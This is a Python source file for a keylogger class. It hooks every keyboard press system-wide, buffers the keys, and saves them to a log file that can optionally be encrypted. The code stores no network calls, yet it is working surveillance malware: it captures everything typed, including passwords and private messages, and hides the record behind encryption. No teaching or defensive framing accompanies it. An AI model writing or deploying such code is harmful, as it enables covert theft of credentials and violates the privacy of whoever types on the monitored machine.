from threading import Event
from time import sleep
from datetime import datetime
import keyboard
import os

class Keylogger:
    def __init__(self, log_file="keylog.txt", save_interval=10, 
                 encryptor=None):
        """
        Initialize the keylogger.
        
        Args:
            log_file: Path to the log file
            save_interval: Number of keystrokes before auto-saving
            encryptor: Optional SimpleFernet instance for encryption
        """
        print("[KEYLOGGER] Initializing...")
        
        self.log_file = log_file
        self.buffer = []
        self.save_interval = save_interval
        self.key_count = 0
        self.hook = None
        self.encryptor = encryptor
        self.running = False
        
        # Initialize log file with header if it doesn't exist
        if not os.path.exists(log_file):
            print("[KEYLOGGER] Creating new log file...")
            header = f"=== Keylogger Started at {datetime.now()} ===\n\n"
            self.write_to_file(header, overwrite=True)
    
    def read_from_file(self):
        """Read and decrypt content from file."""
        try:
            if not os.path.exists(self.log_file):
                return ""
            
            with open(self.log_file, 'rb') as f:
                content = f.read()
            
            if not content:
                return ""
            
            if self.encryptor:
                decrypted = self.encryptor.decrypt(content)
                return decrypted.decode('utf-8')
            else:
                return content.decode('utf-8')
        except Exception as e:
            print(f"[KEYLOGGER ERROR] Failed to read file: {e}")
            return ""
    
    def write_to_file(self, content, overwrite=False):
        """Encrypt and write content to file."""
        try:
            data = content.encode('utf-8')
            
            if self.encryptor:
                data = self.encryptor.encrypt(data)
            
            mode = 'wb' if overwrite else 'ab'
            with open(self.log_file, mode) as f:
                f.write(data)
        except Exception as e:
            print(f"[KEYLOGGER ERROR] Failed to write to file: {e}")
    
    def on_key_event(self, event):
        """Handle key events from the keyboard hook."""
        if event.event_type == 'down':
            key = event.name
            print(f"KEYLOGGER EVENT NAME: {key}")

            if len(key) > 1:
                key = f"[{key.upper()}]"
            self.key_count += 1
            self.buffer += key
            print(f"KEYLOGGER: {self.key_count=} {self.save_interval}")
            
            if self.key_count >= self.save_interval:
                self.save_to_file()
                self.key_count = 0
    
    def save_to_file(self):
        """Save buffered keystrokes to file using read-modify-write pattern."""
        if not self.buffer:
            print("KEYLGGER: buffer is none, not saving")
            return
        
        new_content = ''.join(self.buffer)
        print(f"[KEYLOGGER] Saving {len(self.buffer)} keystrokes...")
        
        # Read existing content
        existing_content = self.read_from_file()
        
        # Combine and rewrite
        combined = existing_content + new_content
        self.write_to_file(combined, overwrite=True)
        
        self.buffer.clear()
    
    def start(self, stop_event: Event | None = None):
        """Start the keylogger."""
        print(f"[KEYLOGGER] Started. Logging to: {self.log_file}")
        if self.encryptor:
            print("[KEYLOGGER] Encryption enabled")
        
        self.running = True
        self.hook = keyboard.hook(self.on_key_event)
        
        try:
            while self.running:
                if stop_event and stop_event.is_set():
                    break
                sleep(0.1)
        except Exception as e:
            print(f"[KEYLOGGER ERROR] {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the keylogger and save any remaining data."""
        if self.hook:
            keyboard.unhook(self.hook)
        
        if self.buffer:
            print(f"[KEYLOGGER] Saving final {len(self.buffer)} keystrokes...")
            self.save_to_file()
        
        print(f"[KEYLOGGER] Stopped. Data saved to {self.log_file}")
        self.running = False